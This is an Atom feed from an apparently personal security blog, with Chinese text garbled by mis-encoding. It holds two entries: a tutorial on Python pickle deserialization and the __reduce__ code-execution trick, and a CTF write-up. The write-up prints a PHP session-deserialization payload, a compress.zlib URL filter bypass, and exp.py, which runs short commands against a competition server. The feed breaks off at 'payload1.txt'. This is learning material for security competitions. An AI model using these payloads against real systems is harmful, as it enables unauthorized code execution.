<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[dkk-blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="/"/>
  <updated>2020-03-12T18:03:21.467Z</updated>
  <id>/</id>
  
  <author>
    <name><![CDATA[dkk]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[åˆå­¦Python PIckle]]></title>
    <link href="/2020/03/12/%E5%88%9D%E5%AD%A6Python-PIckle/"/>
    <id>/2020/03/12/åˆå­¦Python-PIckle/</id>
    <published>2020-03-12T15:46:15.000Z</published>
    <updated>2020-03-12T18:03:21.467Z</updated>
    <content type="html"><![CDATA[<h1><span id="åˆå­¦python-pickle">åˆå­¦Python PIckle</span></h1><hr>
<h2><span id="å‰è¨€">å‰è¨€</span></h2><p>å‰å‡ å¤©æ¯”èµ›ç¢°åˆ°æ²¡å­¦è¿‡çš„çŸ¥è¯†ç‚¹äº†ï¼Œè¡¥ä¸€æ³¢ï¼Œè‡ªå·±è¿˜æ˜¯å¤ªèœäº†</p>
<h2><span id="picklepythonåºåˆ—åŒ–-ååºåˆ—åŒ–">Pickleï¼šPythonåºåˆ—åŒ–ã€ååºåˆ—åŒ–</span></h2><p>pickle.dumps( ) == åºåˆ—åŒ–(å°†ä¸€ä¸ªå¯¹è±¡æ‰“åŒ…æˆä¸€å †çœ‹ä¸æ‡‚çš„å­—ç¬¦ä¸²)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.text = <span class="string">"admin"</span></span><br><span class="line">        self.data = <span class="number">123456</span></span><br><span class="line">        self.dir = [<span class="string">"CTF"</span>,<span class="string">"egg"</span>,<span class="string">"dkk"</span>]</span><br><span class="line">payload = test()</span><br><span class="line">print(pickle.dumps(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'\x80\x03c__main__\ntest\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00textq\x03X\x05\x00\x00\x00adminq\x04X\x04\x00\x00\x00dataq\x05J@\xe2\x01\x00X\x03\x00\x00\x00dirq\x06]q\x07(X\x03\x00\x00\x00CTFq\x08X\x03\x00\x00\x00eggq\tX\x03\x00\x00\x00dkkq\neub.'</span></span><br></pre></td></tr></table></figure>

<p>pickle.loads( ) == ååºåˆ—åŒ– ï¼ˆå°†ä¸€å †çœ‹ä¸æ‡‚çš„å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¯¹è±¡ï¼‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.text = <span class="string">"admin"</span></span><br><span class="line">        self.data = <span class="number">123456</span></span><br><span class="line">        self.dir = [<span class="string">"CTF"</span>,<span class="string">"egg"</span>,<span class="string">"dkk"</span>]</span><br><span class="line">payload = test()</span><br><span class="line">size = pickle.dumps(payload)</span><br><span class="line">print(str(pickle.loads(size).__dict__))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;'text': 'admin', 'data': 123456, 'dir': ['CTF', 'egg', 'dkk']&#125;</span></span><br></pre></td></tr></table></figure>

<p>pickle.loadsæœºåˆ¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">pickle.__file__<span class="comment"># æŸ¥çœ‹pickleæºç ä½ç½®</span></span><br></pre></td></tr></table></figure>

<p>pickle.loadsæ˜¯ä¸€ä¸ªä¾›æˆ‘ä»¬è°ƒç”¨çš„æ¥å£ã€‚å…¶åº•å±‚å®ç°æ˜¯åŸºäº_Unpicklerç±»ã€‚ä»£ç å®ç°å¦‚ä¸‹<br><img src="/2020/03/12/åˆå­¦Python-PIckle/1.png" alt><br>å†çœ‹<code>_Unpickler</code>çš„æºç ï¼Œå¥½åƒæ˜¯å¯¹æ ˆçš„ä¸€äº›æ“ä½œï¼Œä¿ºä¹Ÿçœ‹ä¸å¤ªæ‡‚ï¼Œæºœäº†æºœäº†</p>
<h2><span id="pickletoolsè°ƒè¯•">pickletoolsè°ƒè¯•</span></h2><h3><span id="åŸºæœ¬æ“ä½œ">åŸºæœ¬æ“ä½œ</span></h3><p>pickletoolsæ˜¯pythonè‡ªå¸¦çš„pickleè°ƒè¯•å™¨ï¼Œæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼š<br><code>pickletools.dis(pickle, out=None, memo=None, indentlevel=4)</code>åæ±‡ç¼–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€<br><code>pickletools.optimize(picklestring)</code>ä¼˜åŒ–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€<br><code>pickletools.genops(pickle)</code>è¿”å›ä¸€ä¸ªè¿­ä»£å™¨æ¥ä¾›ç¨‹åºä½¿ç”¨ã€‚<br><img src="/2020/03/12/åˆå­¦Python-PIckle/2.png" alt><br>åæ±‡ç¼–ç»“æœä¸­ï¼ŒBINPUTæŒ‡ä»¤æ²¡æœ‰äº†,æ‰€è°“â€œä¼˜åŒ–â€ï¼Œå…¶å®å°±æ˜¯æŠŠä¸å¿…è¦çš„PUTæŒ‡ä»¤ç»™åˆ é™¤æ‰ã€‚è¿™ä¸ªPUTæ„æ€æ˜¯æŠŠå½“å‰æ ˆçš„æ ˆé¡¶å¤åˆ¶ä¸€ä»½ï¼Œæ”¾è¿›å‚¨å­˜åŒº,æˆ‘ä»¬å¹¶ä¸éœ€è¦è¿™ä¸ªæ“ä½œï¼Œå¯ä»¥çœç•¥æ‰è¿™äº›PUTæŒ‡ä»¤.</p>
<h3><span id="pickleè¯­æ³•ä¸¥æ ¼-å‘å‰å…¼å®¹">pickleï¼šè¯­æ³•ä¸¥æ ¼ã€å‘å‰å…¼å®¹</span></h3><p>pickleæ„é€ å‡ºçš„å­—ç¬¦ä¸²ï¼Œæœ‰å¾ˆå¤šä¸ªç‰ˆæœ¬ã€‚åœ¨pickle.loadsæ—¶ï¼Œå¯ä»¥ç”¨Protocolå‚æ•°æŒ‡å®šåè®®ç‰ˆæœ¬ï¼Œä¾‹å¦‚æŒ‡å®šä¸º0å·ç‰ˆæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.text = <span class="string">"admin"</span></span><br><span class="line">        self.data = <span class="number">123456</span></span><br><span class="line">        self.dir = [<span class="string">"CTF"</span>,<span class="string">"egg"</span>,<span class="string">"dkk"</span>]</span><br><span class="line">payload = test()</span><br><span class="line">dumps = (pickle.dumps(payload,protocol=<span class="number">0</span>))</span><br><span class="line">dumps = pickletools.optimize(dumps)</span><br><span class="line">pickletools.dis(dumps)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'ccopy_reg\n_reconstructor\np0\n(c__main__\ntest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVtext\np6\nVadmin\np7\nsVdata\np8\nI123456\nsVdir\np9\n(lp10\nVCTF\np11\naVegg\np12\naVdkk\np13\nasb.'</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ä¸ä¸Šé¢çš„åºåˆ—åŒ–ç»“æœ(é»˜è®¤ç‰ˆæœ¬å·ï¼š3)æœ‰æ‰€åŒºåˆ«<br><img src="/2020/03/12/åˆå­¦Python-PIckle/3.png" alt><br>0å·èµ·ç è¿˜æ˜¯å¯è¯»çš„ï¼Œä¹‹åçš„ç‰ˆæœ¬åŠ å…¥äº†ä¸€å¤§å †ä¸å¯æ‰“å°å­—ç¬¦<br><img src="/2020/03/12/åˆå­¦Python-PIckle/4.png" alt><br><strong>pickleåè®®æ˜¯å‘å‰å…¼å®¹çš„</strong><br>æ‰€ä»¥å¯ä»¥ä½¿ç”¨0å·ç‰ˆæœ¬çš„å­—ç¬¦ä¸²å¯ä»¥ç›´æ¥äº¤ç»™<code>pickle.loads()</code></p>
<h3><span id="ä¸¾ä¸€ä¸ª">ä¸¾ä¸€ä¸ªğŸŒ°</span></h3><p><img src="/2020/03/12/åˆå­¦Python-PIckle/5.png" alt><br>ç¬¬ä¸€ä¸ªå­—èŠ‚<code>\x80 æºç æ³¨é‡Š#identify pickle protocol</code>æœºå™¨çœ‹åˆ°è¿™ä¸ªæ“ä½œç¬¦ï¼Œç«‹åˆ»å†å»å­—ç¬¦ä¸²è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œå¾—åˆ°<code>\x03</code>ã€‚è§£é‡Šä¸ºâ€œè¿™æ˜¯ä¸€ä¸ª3å·åè®®åºåˆ—åŒ–çš„å­—ç¬¦ä¸²â€ã€‚<br>ç¬¬äºŒä¸ªå­—èŠ‚<code>c</code>å®ƒè¿ç»­è¯»å–ä¸¤ä¸ªå­—ç¬¦ä¸²moduleå’Œnameï¼ˆç”¨<code>\n</code>åˆ†å‰²ï¼‰,æ¥ä¸‹æ¥æŠŠmodule.nameè¿™ä¸ªä¸œè¥¿å‹è¿›æ ˆã€‚æˆ‘ä»¬è¿™é‡Œå°±æ˜¯æŠŠ<code>__main__.test</code>æ”¾è¿›æ ˆé‡Œ<br>ç¬¬ä¸‰ä¸ªå­—èŠ‚<code>)</code> push empty tuple<br>ç¬¬å››ä¸ªå­—èŠ‚<code>\x81</code> ä»æ ˆä¸­å…ˆå¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œè®°ä¸ºargsï¼›å†å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œè®°ä¸ºclsã€‚æ¥ä¸‹æ¥ï¼Œæ‰§è¡Œ<code>cls.__new__(cls, *args)</code>ï¼Œç„¶åæŠŠå¾—åˆ°çš„ä¸œè¥¿è¿›æ ˆï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å®ä¾‹åŒ–çš„å¯¹è±¡<code>test</code>æ”¾è¿›æ ˆ<br>ç¬¬äº”ä¸ªå­—èŠ‚<code>}</code>push empty dict<br>ç¬¬å…­ä¸ªå­—èŠ‚<code>X</code>counted UTF-8 string argument<br>ç¬¬ä¸ƒä¸ªå­—èŠ‚<code>]</code>push empty list æŠŠå½“å‰æ ˆè¿™ä¸ªæ•´ä½“ï¼Œä½œä¸ºä¸€ä¸ªlistï¼Œå‹è¿›å‰åºæ ˆ,æŠŠå½“å‰æ ˆæ¸…ç©ºã€‚è¿™ä¸ªæ“ä½œä¹Ÿå«<code>load_mark</code><br>ä¸å®ƒç›¸åçš„å¦ä¸€ä¸ªæ“ä½œ<code>pop_mark</code><br><code>X K</code>æŒ‰ç…§ä¼ å…¥çš„ç±»å‹æ‰§è¡Œè¿›æ ˆçš„æ“ä½œ<br><code>e</code>ç›®å‰çš„<br><code>s</code>å‘dictæ·»åŠ key+value<br><code>b</code>æŠŠå½“å‰æ ˆæ ˆé¡¶å­˜è¿›stateï¼Œç„¶åå¼¹æ‰,æŠŠå½“å‰æ ˆæ ˆé¡¶è®°ä¸ºinstï¼Œç„¶åå¼¹æ‰,åˆ©ç”¨stateè¿™ä¸€ç³»åˆ—çš„å€¼æ¥æ›´æ–°å®ä¾‹instã€‚æŠŠå¾—åˆ°çš„å¯¹è±¡æ‰”è¿›å½“å‰æ ˆ.</p>
<h3><span id="reduce-åˆ©ç”¨"><strong>reduce</strong> åˆ©ç”¨</span></h3><p><code>class</code>çš„<code>__reduce__</code>æ–¹æ³•ï¼Œåœ¨<code>pickle</code>ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«æ‰§è¡Œã€‚å…¶åº•å±‚çš„ç¼–ç æ–¹æ³•ï¼Œå°±æ˜¯åˆ©ç”¨äº†<code>R</code>æŒ‡ä»¤ç <br><img src="/2020/03/12/åˆå­¦Python-PIckle/6.png" alt><br><img src="/2020/03/12/åˆå­¦Python-PIckle/7.png" alt><br>ä¸‹é¢è¿™ä¸ªé‡Œé¢æ²¡æœ‰<strong>reduce</strong>æ–¹æ³•</p>
<h3><span id="ä¾‹é¢˜é«˜æ ¡å…¬ç›Šèµ›webtmp">ä¾‹é¢˜ï¼šé«˜æ ¡å…¬ç›Šèµ›webtmp</span></h3><p>å½»åº•è¿‡æ»¤äº†RæŒ‡ä»¤ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span></span><br></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="åˆå­¦python-pickle">åˆå­¦Python PIckle</span></h1><hr>
<h2><span id="å‰è¨€">å‰è¨€</span></h2><p>å‰å‡ å¤©æ¯”èµ›ç¢°åˆ°æ²¡å­¦è¿‡çš„çŸ¥è¯†ç‚¹äº†ï¼Œè¡¥ä¸€æ³¢ï¼Œè‡ªå·±è¿˜æ˜¯å¤ªèœäº†</p>
<h2><span ]]>
    </summary>
    
      <category term="Web" scheme="/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[[é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›] éƒ¨åˆ†WriteUp]]></title>
    <link href="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%81%94%E8%B5%9B%E9%83%A8%E5%88%86Writeup/"/>
    <id>/2020/03/09/é«˜æ ¡æˆ˜ç–«è”èµ›éƒ¨åˆ†Writeup/</id>
    <published>2020-03-09T05:22:39.000Z</published>
    <updated>2020-03-12T03:15:44.798Z</updated>
    <content type="html"><![CDATA[<h1><span id="é«˜æ ¡æˆ˜ç–«ç½‘ç»œå®‰å…¨åˆ†äº«èµ›-éƒ¨åˆ†writeup">[é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›] éƒ¨åˆ†WriteUp</span></h1><p>[TOC]</p>
<!-- toc -->

<ul>
<li><a href="#å‰è¨€">å‰è¨€</a></li>
<li><a href="#hackme">Hackme</a><ul>
<li><a href="#sessionååºåˆ—åŒ–">Sessionååºåˆ—åŒ–</a></li>
<li><a href="#bypass-url">Bypass $url</a></li>
</ul>
</li>
<li><a href="#php-uaf">PHP-UAF</a></li>
<li><a href="#webct">webct</a></li>
<li><a href="#sqlcheckin">sqlcheckin</a></li>
</ul>
<!-- tocstop -->

<h2><span id="å‰è¨€">å‰è¨€</span></h2><p>æˆ‘å¤ªèœäº†ï¼Œè®°å½•ä¸€ä¸‹Webé¢˜ç›®</p>
<h2><span id="hackme">Hackme</span></h2><p><code>http://121.36.222.22:88/?page=index</code><br>çœ‹åˆ°é“¾æ¥è¿˜æƒ³ä¼šä¸ä¼šæ˜¯ç›®å½•ç©¿è¶Šä»»æ„æ–‡ä»¶è¯»å–ä»€ä¹ˆçš„è¿˜è¯•äº†è¯•<code>../../../../flag</code>ï¼Œä¿ºæœç„¶æ˜¯èœé¸¡</p>
<h3><span id="sessionååºåˆ—åŒ–">Sessionååºåˆ—åŒ–</span></h3><p>æ‰«ç›®å½•<code>www.zip</code>æ‹¿åˆ°æºç <br>å®¡è®¡æºç ï¼Œæ²¡æœ‰çœ‹åˆ°æ‰§è¡Œå‘½ä»¤æˆ–è€…è¾“å‡ºflagçš„åœ°æ–¹<br>init.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åˆå§‹åŒ–æ•´ä¸ªé¡µé¢</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//lib.phpåŒ…æ‹¬ä¸€äº›å¸¸è§çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p><code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code>çŒœæµ‹å¯èƒ½æ˜¯<a href="https://www.freebuf.com/column/199220.html" target="_blank" rel="noopener">Sessionååºåˆ—åŒ–</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/82703639" target="_blank" rel="noopener">å››ä¸ªå®ä¾‹é€’è¿›phpååºåˆ—åŒ–æ¼æ´ç†è§£</a><br>éœ€è¦æ‰¾åˆ°<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>å·§äº†åœ¨<code>upload_sign.php</code>æ‰¾åˆ°äº†ï¼Œ<br>exp.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line">&#125;</span><br><span class="line">$info = <span class="keyword">new</span> info();</span><br><span class="line">$info -&gt; admin = <span class="number">1</span>;</span><br><span class="line">$info -&gt; sign = <span class="string">'1'</span>;</span><br><span class="line">var_dump(serialize($info));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼ŒPOSTæ—¶å‰é¢æœ‰ä¸€ä¸ª<code>|</code>ï¼Œåé¢çš„æ•°æ®ï¼Œåœ¨å‚¨å­˜æ—¶å°±ä¼šåŠ ä¸Šé”®åè¿›è¡Œåºåˆ—åŒ–ï¼Œä½†æ˜¯è¿›è¡Œè¯»å–çš„æ—¶å€™è¿˜æ˜¯ä¼šæŒ‰ç…§php handleræ¥å¤„ç†ï¼Œä»¥<code>|</code>ä½œä¸ºé”®å’Œå€¼çš„åˆ†éš”ç¬¦ï¼Œå°†å‰åŠéƒ¨åˆ†å½“ä½œé”®ï¼ŒååŠéƒ¨åˆ†å½“ä½œå€¼,ç„¶åè¿›è¡Œååºåˆ—åŒ–</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Url:http://121.36.222.22:88/upload_sign.php</span><br><span class="line">Post:sign=|O:4:&quot;info&quot;:2:&#123;s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®<code>./core/index.php</code>å°±å‘ç°åˆå‡ºæ¥ä¸€å †ä»£ç ï¼ŒWebå±Šçš„å¥—å¨ƒ</p>
<h3><span id="bypass-url">Bypass $url</span></h3><p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'åªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹åˆ°æˆ‘å“Ÿ'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$url ä¸‰é‡æ£€æµ‹</p>
<ul>
<li><code>filter_var($url, FILTER_VALIDATE_URL)</code><br><img src="/2020/03/09/é«˜æ ¡æˆ˜ç–«è”èµ›éƒ¨åˆ†Writeup/1.png" alt></li>
<li><code>preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)</code><br><img src="/2020/03/09/é«˜æ ¡æˆ˜ç–«è”èµ›éƒ¨åˆ†Writeup/2.png" alt><br>ä¸èƒ½å‡ºç°<code>data://</code>æˆ–è€…<code>&amp;</code>æˆ–è€…<code>|</code>æˆ–è€…<code>./</code></li>
<li><code>preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])</code>        //è¿™ä¸ªä¹Ÿä¸ç®—æ£€æµ‹<br>ä¸€æ—¶é—´æ²¡æƒ³èµ·<code>ByteCTFçš„boring_code</code>è¿˜æ˜¯å¤ªèœäº†ï¼Œå¤§å¸ˆå‚…çš„æé†’ä¸‹æ‰¾äº†å‡ ç¯‡Writeupï¼Œæ‰¾äº†ä¸€ä¸‹åˆå¤§éƒ¨åˆ†éƒ½æ˜¯<code>èŠ±é’±ä¹°åŸŸå</code>    ã€<code>åˆ©ç”¨ç™¾åº¦ç½‘ç›˜æˆ–è€…ç™¾åº¦æœç´¢è·³è½¬</code>æˆ–è€…<code>åˆ©ç”¨ç™¾åº¦302è·³è½¬</code><br>æœ€åå¸ˆå‚…å‘Šæˆ‘æœ‰ä¸ª<code>compress.zlib://data</code><br><img src="/2020/03/09/é«˜æ ¡æˆ˜ç–«è”èµ›éƒ¨åˆ†Writeup/3.png" alt><br>èƒ½æ‰§è¡Œå‘½ä»¤äº†ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œè€Œä¸”æ¯æ¬¡æ‰§è¡Œå‘½ä»¤é•¿åº¦ä¸èƒ½è¶…è¿‡4âƒ£ï¸<br>è€é¢˜äº†<code>hitcon-ctf-2017çš„babyfirst-revenge-v2</code><br>å‚è€ƒæ–‡ç« <a href="https://blog.csdn.net/nzjdsds/article/details/102940762" target="_blank" rel="noopener">ä¸æ­¢è¿™ä¸€ä¸ª</a><br>exp.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line">url = <span class="string">'http://121.36.222.22:88/core/'</span></span><br><span class="line">url1 = <span class="string">'http://121.36.222.22:88/upload_sign.php'</span></span><br><span class="line">post1=&#123;</span><br><span class="line">    <span class="string">"sign"</span>:<span class="string">'|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:2:"ls";&#125;'</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">"compress.zlib://data:@127.0.0.1/888?,&#123;&#125;"</span></span><br><span class="line">req.post(url1,data=post1)</span><br><span class="line">text = req.get(url).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="keyword">if</span> len(text)&lt;<span class="number">15</span>:</span><br><span class="line">    print(text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[+]start attack!!!"</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"payload1.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        i=i.rstrip(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="comment">#print(payload.format(i))</span></span><br><span class="line">        post_payload=&#123;</span><br><span class="line">            <span class="string">"url"</span>:payload.format(i)</span><br><span class="line">        &#125;</span><br><span class="line">        print(post_payload)</span><br><span class="line">        text = req.post(url,data=post_payload).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> len(text)&gt;<span class="number">42</span>:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"[+]"</span>+payload.format(i)+<span class="string">'\n'</span>+text)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>payload1.txt</p>
